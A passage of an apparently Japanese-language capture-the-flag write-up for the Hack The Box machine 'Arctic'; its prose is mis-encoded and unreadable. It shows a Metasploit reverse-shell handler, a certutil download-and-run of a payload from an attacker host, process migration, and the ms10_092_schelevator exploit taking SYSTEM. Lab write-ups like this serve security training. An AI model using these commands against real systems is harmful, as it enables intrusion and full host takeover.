+ -- --=[ 7 evasion                                       ]

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set lport 9090
lport => 9090
msf5 exploit(multi/handler) > set lhost 10.10.14.13
lhost => 10.10.14.13
msf5 exploit(multi/handler) > exploit -j
```


ä»¥ä¸‹ã¨ã£ãŸãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã§

```
C:\ColdFusion8\runtime\bin>certutil.exe -urlcache -split -f "http://10.10.14.13:8000/arctic.exe" arctic.exe
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/arctic.exe" arctic.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

C:\ColdFusion8\runtime\bin>arctic.exe
arctic.exe
```

ã“ã‚Œã§ã—ã°ã‚‰ãã™ã‚‹ã¨ msfconsole ã§

```
[*] Meterpreter session 1 opened (10.10.14.13:9090 -> 10.10.10.11:49609) at 2020-02-19 10:40:51 -0500
```
ã“ã®ã‚ˆã†ã«åå¿œãŒå¸°ã£ã¦ãã¾ã™ã€‚

## meterpreterã®ãƒã‚§ãƒƒã‚¯
ã¡ã‚ƒã‚“ã¨å‹•ãã‹ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚

```
msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > load stdapi
Loading extension stdapi...meterpreter > 
meterpreter > sysinfo
Computer        : ARCTIC
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
Computer        : ARCTIC
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: ARCTIC\tolis
Server username: ARCTIC\tolis
```
å®Œç’§ã§ã™

ã“ã“ã§ Architecture ã¯ x64 ã«ãªã£ã¦ã„ã‚‹ã®ã«å¯¾ã—ã€Meterpreter ã¯ x86/windows ã¨ãªã£ã¦ã„ã‚‹ã“ã¨ã«æ°—ãŒã¤ãã¾ã™ã€‚
ã“ã‚Œã‚’æƒãˆã¾ã™ã€‚

## ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä¹—ã‚Šç§»ã‚‹

```
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User          Path
 ---   ----  ----                     ----  -------  ----          ----
 0     0     [System Process]                                      
 4     0     System                                                
 236   4     smss.exe                                              
 328   308   csrss.exe                                             
 336   484   svchost.exe                                           
 372   308   wininit.exe                                           
 392   380   csrss.exe                                             
 436   380   winlogon.exe                                          
 484   372   services.exe                                          
 500   372   lsass.exe                                             
 508   372   lsm.exe                                               
 608   484   svchost.exe                                           
 680   484   svchost.exe                                           
 756   436   LogonUI.exe                                           
 764   484   svchost.exe                                           
 804   484   svchost.exe                                           
 840   484   spoolsv.exe                                           
 852   484   svchost.exe                                           
 908   484   svchost.exe                                           
 924   1832  arctic.exe               x86   0        ARCTIC\tolis  C:\ColdFusion8\runtime\bin\arctic.exe
 948   484   svchost.exe                                           
 1048  484   CF8DotNetsvc.exe                                      
 1092  1048  JNBDotNetSide.exe                                     
 1100  328   conhost.exe                                           
 1120  328   conhost.exe                                           
 1136  1312  k2server.exe                                          
 1148  484   jrunsvc.exe              x64   0        ARCTIC\tolis  C:\ColdFusion8\runtime\bin\jrunsvc.exe
 1176  1148  jrun.exe                 x64   0        ARCTIC\tolis  C:\ColdFusion8\runtime\bin\jrun.exe
 1184  484   swagent.exe                                           
 1192  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 1224  484   swstrtr.exe                                           
 1236  1224  swsoc.exe                                             
 1244  328   conhost.exe                                           
 1312  484   k2admin.exe                                           
 1424  608   WmiPrvSE.exe                                          
 1456  484   svchost.exe                                           
 1512  484   VGAuthService.exe                                     
 1752  484   vmtoolsd.exe                                          
 1776  484   ManagementAgentHost.exe                               
 1832  1176  cmd.exe                  x64   0        ARCTIC\tolis  C:\Windows\System32\cmd.exe
 2092  1312  k2index.exe                                           
 2116  328   conhost.exe                                           
 3068  484   svchost.exe                                           
 3144  484   dllhost.exe                                           
 3304  484   msdtc.exe                                             
 3384  328   conhost.exe              x64   0        ARCTIC\tolis  C:\Windows\System32\conhost.exe
 3928  484   sppsvc.exe                                            
```

`jrunsvc.exe`ã«ä¹—ã‚Šç§»ã‚Šã¾ã™ã€‚

```

meterpreter > migrate 1148
[*] Migrating from 924 to 1148...
[*] Migration completed successfully.
```



### psã‚³ãƒãƒ³ãƒ‰ã€migrateã‚³ãƒãƒ³ãƒ‰ã«ã¤ã„ã¦

```
ps ãƒ—ãƒ­ã‚»ã‚¹ã®ä¸€è¦§ã‚’å–å¾—
migrate ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãªãƒ—ãƒ­ã‚»ã‚¹ã«ç§»å‹•ã—ã¾ã™ã€‚
```

[The Ultimate Command Cheat Sheet for Metasploit's Meterpreter](https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/)
[Metasploit Post-Exploitation](http://www.byakuya-shobo.co.jp/hj/moh2/pdf/moh2_p146_p149.pdf)

## suggesterã‚’ä½¿ã†
suggester ã¯
ã“ã® exploit ä½¿ãˆã‚‹ã‚“ã˜ã‚ƒã­ï¼Ÿ
ã¿ãŸã„ãªã®ã‚’èª¿ã¹ã¦ãã‚Œã¾ã™

```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > search suggester
                                                                                                                                                                               
Matching Modules                                                                                                                                                               
================                                                                                                                                                               
                                                                                                                                                                               
   #  Name                                      Disclosure Date  Rank    Check  Description                                                                                    
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.11 - Collecting local exploits for x64/windows...
[*] 10.10.10.11 - 13 exploit checks are being tried...
[+] 10.10.10.11 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[*] Post module execution completed

```

## suggesterãŒãŠã™ã™ã‚ã—ã¦ãã‚ŒãŸã‚„ã¤ã‚’å®Ÿè¡Œ
ä»Šå›ã¯ exploit/windows/local/ms10_092_schelevator ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
ï¼ˆè‰²ã‚“ãª writeup ã§ä½¿ã‚ã‚Œã¦ã„ãŸã®ã§ï¼‰ï¼ˆa fairly common and reliable one ã‚‰ã—ã„ã§ã™ï¼‰

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_092_schelevator
msf5 exploit(windows/local/ms10_092_schelevator) > set session 1
session => 1
msf5 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.13
msf5 exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Preparing payload at C:\Users\tolis\AppData\Local\Temp\saaKbk.exe
[*] Creating task: 1uBDeH8S
[*] SUCCESS: The scheduled task "1uBDeH8S" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\1uBDeH8S...
[*] Original CRC32: 0xffb3d93d
[*] Final CRC32: 0xffb3d93d
[*] Writing our modified content back...
[*] Validating task: 1uBDeH8S
[*] 
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] 1uBDeH8S                                 1/3/2020 3:56:00 ï¿½ï¿½    Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "1uBDeH8S" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "1uBDeH8S" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (180291 bytes) to 10.10.10.11
[*] SUCCESS: Attempted to run the scheduled task "1uBDeH8S".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.13:4444 -> 10.10.10.11:50110) at 2020-02-19 12:58:37 -0500
[*] SUCCESS: The scheduled task "1uBDeH8S" was successfully deleted.
[*] SCHELEVATOR

meterpreter >
```

## root.txtã‚’ã¨ã‚‹

```
meterpreter > pwd
C:\Windows\system32
meterpreter > shell
Process 1056 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>more c:\\users\\administrator\\desktop\\root.txt
```

ã“ã‚Œã§ root.txt ã®å†…å®¹ãŒå–ã‚Œã¾ã™ï¼

## çµ‚ã‚ã‚Šã«
ã¡ãªã¿ã« user.txt ã‚’ã¨ã‚Šå¿˜ã‚Œã¦ã„ãŸã®ã§ã™ãŒã€ä¼¼ãŸã‚ˆã†ãªæ–¹æ³•ã§å–å¾—ã§ãã‚‹ã®ã§å‰²æ„›ã—ã¾ã™ã€‚

ã²ã¨ã¤ã® machine æ”»ç•¥ã§ã“ã“ã¾ã§å¤šãã®ã“ã¨ã‚’å­¦ã¹ã‚‹ã¨ã¯æ€ã£ã¦ã„ã¾ã›ã‚“ã§ã—ãŸã€‚ã“ã‚Œã‹ã‚‰ç²¾é€²ã—ã¦ã„ãã¾ã™ã€‚

è¨‚æ­£ã‚„ã‚¢ãƒ‰ãƒã‚¤ã‚¹ãªã©ãŒã‚ã‚Œã°ã‚³ãƒ¡ãƒ³ãƒˆã‹ Twitter ã«ãŠé¡˜ã„ã—ã¾ã™ï¼
[ã•ã‚“ã½ã—(@sanpo_shiho) | Twitter](https://twitter.com/sanpo_shiho)

